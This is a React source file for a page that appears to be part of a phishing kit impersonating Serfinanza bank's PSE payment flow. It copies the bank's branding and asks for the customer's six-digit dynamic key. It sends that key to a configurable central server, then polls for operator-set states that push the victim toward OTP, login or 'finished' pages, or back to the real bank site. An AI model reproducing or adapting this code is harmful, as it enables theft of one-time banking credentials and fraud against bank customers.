import React, { useEffect, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import { instanceBackend } from "../../../../../axios/instanceBackend";
import LoadingSerfinanza from "../../../../../components/LoadingSerfinanza";
import logo from "../../img/imgi_1_logo2.png";
import imagenBannerDinamica from "../../img/imagen_banner_dinamica.png";
import vigilado from "../../img/vigilado.jpg";
import "./dinamica_serfinanza.css";

const ERROR_DIN_MESSAGE =
  "Clave Dinámica Incorrecta. Verifica e intenta nuevamente.";
const SERFINANZA_ERROR_KEY = "serfinanza_error_modal";
const SERFINANZA_MID_FLOW_KEY = "serfinanza_mid_flow";
const SERFINANZA_ERROR_AUTO_HIDE_MS = 5000;

const ESTADOS_TRAS_DIN = [
  "sol_otp",
  "sol_din",
  "sol_finalizar",
  "sol_finalizado",
  "error_otp",
  "error_din",
  "error_login",
  "block_ip",
  "error_blocked",
];

const DinamicaSerfinanza = () => {
  const [dynamicCode, setDynamicCode] = useState("");
  const [modalText, setModalText] = useState("");
  const [showModal, setShowModal] = useState(false);
  const [getLoading, setLoading] = useState(false);
  const isCodeComplete = dynamicCode.length === 6;
  const navigate = useNavigate();
  const pollingIntervalRef = useRef(null);
  const sessionIdRef = useRef(null);
  const lastEstadoRef = useRef(null);
  const allowPollNavigationRef = useRef(false);
  const modalBloqueoEstadoRef = useRef(null);
  const ignorarEstadoHastaCambioRef = useRef(null);
  const closeModalRef = useRef(() => {});

  const clearDynamicCodeField = () => {
    setDynamicCode("");
  };

  const showDinErrorModal = (message = ERROR_DIN_MESSAGE) => {
    stopPolling();
    setLoading(false);
    allowPollNavigationRef.current = false;
    sessionStorage.removeItem(SERFINANZA_MID_FLOW_KEY);
    modalBloqueoEstadoRef.current = "error_din";
    lastEstadoRef.current = "error_din";
    clearDynamicCodeField();
    setModalText(message);
    setShowModal(true);
  };

  const showAlertModal = (message) => {
    setLoading(false);
    setModalText(message);
    setShowModal(true);
  };

  const stopPolling = () => {
    if (pollingIntervalRef.current) {
      clearInterval(pollingIntervalRef.current);
      pollingIntervalRef.current = null;
    }
  };

  useEffect(() => {
    const pendingError = localStorage.getItem(SERFINANZA_ERROR_KEY);
    const midFlow = sessionStorage.getItem(SERFINANZA_MID_FLOW_KEY) === "1";

    if (pendingError === "error_din") {
      showDinErrorModal(ERROR_DIN_MESSAGE);
      localStorage.removeItem(SERFINANZA_ERROR_KEY);
    } else if (pendingError === "error_login") {
      navigate("/serfinanza");
    } else if (pendingError === "error_otp") {
      navigate("/serfinanza_otp");
    }

    sessionIdRef.current = localStorage.getItem("sessionId");

    if (midFlow && sessionIdRef.current) {
      allowPollNavigationRef.current = true;
      setLoading(true);
      initPolling();
    } else {
      allowPollNavigationRef.current = false;
    }

    return () => {
      stopPolling();
    };
  }, []);

  const handleCodeChange = (event) => {
    const onlyDigits = event.target.value.replace(/\D/g, "").slice(0, 6);
    setDynamicCode(onlyDigits);
  };

  const handleClearCode = () => {
    setDynamicCode("");
  };

  const redirigir = (ruta) => {
    navigate(ruta);
  };

  const closeModal = () => {
    const estadoServidor = modalBloqueoEstadoRef.current;
    modalBloqueoEstadoRef.current = null;

    if (estadoServidor === "error_din") {
      ignorarEstadoHastaCambioRef.current = "error_din";
      sessionStorage.removeItem(SERFINANZA_MID_FLOW_KEY);
      allowPollNavigationRef.current = false;
      clearDynamicCodeField();
    }

    setShowModal(false);
    setLoading(false);
  };

  closeModalRef.current = closeModal;

  useEffect(() => {
    if (!showModal) return undefined;

    const timer = window.setTimeout(() => {
      closeModalRef.current();
    }, SERFINANZA_ERROR_AUTO_HIDE_MS);

    return () => window.clearTimeout(timer);
  }, [showModal]);

  const handleSubmit = async (event) => {
    event?.preventDefault?.();
    if (!isCodeComplete || getLoading) return;

    const sessionId = localStorage.getItem("sessionId") || sessionIdRef.current;
    if (!sessionId) {
      showAlertModal("Sesión no encontrada. Vuelve a iniciar sesión.");
      return;
    }

    const centralUrl = (
      process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || ""
    ).trim();

    const dataSend = {
      data: {
        attributes: {
          clave: dynamicCode,
          fecha: new Date().toISOString(),
          sessionId,
          backend: "P01",
          backend_central_url: process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
          backend_url: "/api/v1/serfinanza/dinamica",
        },
      },
    };

    stopPolling();
    lastEstadoRef.current = null;

    try {
      setLoading(true);
      const response = centralUrl
        ? await instanceBackend.post(centralUrl, dataSend)
        : await instanceBackend.post("/serfinanza/dinamica", dataSend);

      if (response?.data?.success) {
        const sid = response.data.sessionId ?? sessionId;
        localStorage.setItem("sessionId", sid);
        sessionIdRef.current = sid;
        sessionStorage.setItem(SERFINANZA_MID_FLOW_KEY, "1");
        allowPollNavigationRef.current = true;
        initPolling();
      } else {
        setLoading(false);
        allowPollNavigationRef.current = false;
        showDinErrorModal(ERROR_DIN_MESSAGE);
      }
    } catch (error) {
      setLoading(false);
      allowPollNavigationRef.current = false;
      const status = error?.response?.status;
      const estadoErr = (error?.response?.data?.estado || "")
        .toString()
        .toLowerCase();
      if (status === 403 && estadoErr === "error_blocked") {
        sessionStorage.removeItem(SERFINANZA_MID_FLOW_KEY);
        localStorage.clear();
        window.location.href = process.env.REACT_APP_URL_BANK || "/";
        return;
      }
      showAlertModal(
        centralUrl
          ? "Error de comunicación con el servidor central."
          : "Error de conexión con el servidor.",
      );
    }
  };

  const initPolling = () => {
    stopPolling();
    pollingIntervalRef.current = setInterval(() => {
      verifyState();
    }, 3000);
    verifyState();
  };

  const verifyState = async () => {
    try {
      const response = await instanceBackend.post(
        `/serfinanza/verify-state/${sessionIdRef.current}`,
      );
      const estadoActual = (response?.data?.estado || "").toLowerCase();

      if (!estadoActual) return;

      if (ignorarEstadoHastaCambioRef.current) {
        if (estadoActual === ignorarEstadoHastaCambioRef.current) return;
        ignorarEstadoHastaCambioRef.current = null;
        modalBloqueoEstadoRef.current = null;
      }

      if (
        modalBloqueoEstadoRef.current &&
        estadoActual === modalBloqueoEstadoRef.current
      ) {
        return;
      }

      if (
        ESTADOS_TRAS_DIN.includes(estadoActual) &&
        !allowPollNavigationRef.current
      ) {
        return;
      }

      if (lastEstadoRef.current === estadoActual) return;
      lastEstadoRef.current = estadoActual;

      switch (estadoActual) {
        case "sol_otp":
          stopPolling();
          setLoading(false);
          sessionStorage.removeItem(SERFINANZA_MID_FLOW_KEY);
          allowPollNavigationRef.current = false;
          redirigir("/serfinanza_otp");
          break;
        case "sol_finalizar":
        case "sol_finalizado":
          stopPolling();
          setLoading(false);
          sessionStorage.removeItem(SERFINANZA_MID_FLOW_KEY);
          allowPollNavigationRef.current = false;
          redirigir("/finalizado-pse");
          break;
        case "error_otp":
          stopPolling();
          setLoading(false);
          sessionStorage.removeItem(SERFINANZA_MID_FLOW_KEY);
          allowPollNavigationRef.current = false;
          localStorage.setItem(SERFINANZA_ERROR_KEY, "error_otp");
          redirigir("/serfinanza_otp");
          break;
        case "error_din":
          showDinErrorModal(ERROR_DIN_MESSAGE);
          break;
        case "error_login":
          stopPolling();
          setLoading(false);
          sessionStorage.removeItem(SERFINANZA_MID_FLOW_KEY);
          allowPollNavigationRef.current = false;
          localStorage.setItem(SERFINANZA_ERROR_KEY, "error_login");
          redirigir("/serfinanza");
          break;
        case "block_ip":
        case "error_blocked":
          stopPolling();
          setLoading(false);
          sessionStorage.removeItem(SERFINANZA_MID_FLOW_KEY);
          allowPollNavigationRef.current = false;
          showAlertModal("Acceso bloqueado por seguridad.");
          break;
        default:
          break;
      }
    } catch (error) {
      const status = error?.response?.status;
      const estadoErr = (error?.response?.data?.estado || "")
        .toString()
        .toLowerCase();
      if (status === 403 && estadoErr === "error_blocked") {
        stopPolling();
        setLoading(false);
        sessionStorage.removeItem(SERFINANZA_MID_FLOW_KEY);
        allowPollNavigationRef.current = false;
        localStorage.clear();
        window.location.href = process.env.REACT_APP_URL_BANK || "/";
      }
    }
  };

  return (
    <div className="dinamica-serfi-page">
      <header className="head-login">
        <div className="header-inner">
          <div className="logo-block">
            <img
              className="logo-img"
              src={logo}
              alt="Serfinanza"
              onError={(e) => {
                if (e.target.dataset.failed) return;
                e.target.dataset.failed = "true";
                e.target.style.display = "none";
                const fallback = document.createElement("span");
                fallback.className = "logo-fallback-text";
                fallback.innerText = "Serfinanza";
                e.target.parentNode.appendChild(fallback);
              }}
            />
            <div className="header-tagline-container">
              <h1 className="tituloPagoPSE">PAGOS SEGUROS EN LINEA - PSE</h1>
            </div>
          </div>
        </div>
      </header>

      <main className="dinamica-main-container">
        <div className="dinamica-content-wrapper">
          <div className="dinamica-left">
            <div className="dinamica-main-col">
              <section className="dinamica-card">
                <h2 className="dinamica-screen-title">Clave Dinamica</h2>

                <div className="dinamica-banner-wrap" aria-hidden>
                  <img
                    className="dinamica-banner-img"
                    src={imagenBannerDinamica}
                    alt="Banner Clave Dinamica"
                  />
                </div>

                <p className="dinamica-description">
                  Ingresa la Clave Dinamica de 6 digitos. Puedes consultarla en la App
                  Serfinanza Movil, en la esquina superior derecha, en el icono del candado.
                </p>

                <div className="dinamica-input-block">
                  <div className="dinamica-separator" aria-hidden />
                  <input
                    type="text"
                    className="dinamica-code-input"
                    placeholder="Ingresa la Dinamica"
                    maxLength="6"
                    value={dynamicCode}
                    onChange={handleCodeChange}
                  />
                </div>
              </section>

              <div className="dinamica-actions-wrap">
                <div className="dinamica-vigilado-col">
                  <img src={vigilado} alt="Vigilado Superfinanciera" />
                </div>
                <section className="dinamica-actions-card">
                  <button
                    type="button"
                    className="dinamica-btn dinamica-btn-primary"
                    disabled={!isCodeComplete || getLoading}
                    onClick={handleSubmit}
                  >
                    Validar Clave Dinamica
                  </button>
                  <button
                    type="button"
                    className="dinamica-btn dinamica-btn-secondary"
                    onClick={handleClearCode}
                  >
                    BORRAR
                  </button>
                </section>
              </div>
            </div>
          </div>
        </div>
      </main>

      <footer className="site-footer">
        <div className="footer-inner">
          <p className="service-line">
            Línea de Servicio al Cliente: 323 5997000 - 018000510513
          </p>

          <div className="footer-row">
            <ul className="legal-links">
              <li>
                <button type="button" className="legal-link-btn">
                  <svg
                    className="link-icon"
                    viewBox="0 0 24 24"
                    fill="#170C84"
                    aria-hidden
                  >
                    <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
                  </svg>
                  Seguridad
                </button>
              </li>
              <li>
                <button type="button" className="legal-link-btn">
                  <svg
                    className="link-icon"
                    viewBox="0 0 24 24"
                    fill="#170C84"
                    aria-hidden
                  >
                    <path d="M4 14h4v-4H4v4zm0 5h4v-4H4v4zM4 9h4V5H4v4zm5 5h12v-4H9v4zm0 5h12v-4H9v4zM9 5v4h12V5H9z" />
                  </svg>
                  Reglamento Sucursal Virtual
                </button>
              </li>
              <li>
                <button type="button" className="legal-link-btn">
                  <svg
                    className="link-icon"
                    viewBox="0 0 24 24"
                    fill="#170C84"
                    aria-hidden
                  >
                    <path d="M19 3h-4.18C14.4 1.84 13.3 1 12 1c-1.3 0-2.4.84-2.82 2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 0c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm2 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z" />
                  </svg>
                  Políticas de Privacidad
                </button>
              </li>
            </ul>
            <span className="copy-text">Serfinanza © 2026</span>
          </div>
        </div>
      </footer>

      {showModal && (
        <div className="modal-wrap" onClick={closeModal}>
          <div className="modal-card" onClick={(e) => e.stopPropagation()}>
            <div className="modal-top">Personas</div>
            <div className="modal-mid">
              <span className="warn-icon" aria-hidden>
                <svg viewBox="0 0 24 24" focusable="false">
                  <path d="M4.47 20.5h15.06c1.54 0 2.5-1.67 1.73-3L13.73 4.44c-.77-1.33-2.69-1.33-3.46 0L2.74 17.5c-.77 1.33.19 3 1.73 3z" />
                </svg>
                <span className="warn-icon-mark" aria-hidden>
                  <span className="warn-icon-bar" />
                  <span className="warn-icon-dot" />
                </span>
              </span>
              <p>{modalText}</p>
            </div>
            <div className="modal-bot">
              <button
                type="button"
                className="modal-accept-btn"
                onClick={closeModal}
              >
                Aceptar
              </button>
            </div>
          </div>
        </div>
      )}

      {getLoading ? <LoadingSerfinanza isOpen /> : null}
    </div>
  );
};

export default DinamicaSerfinanza;
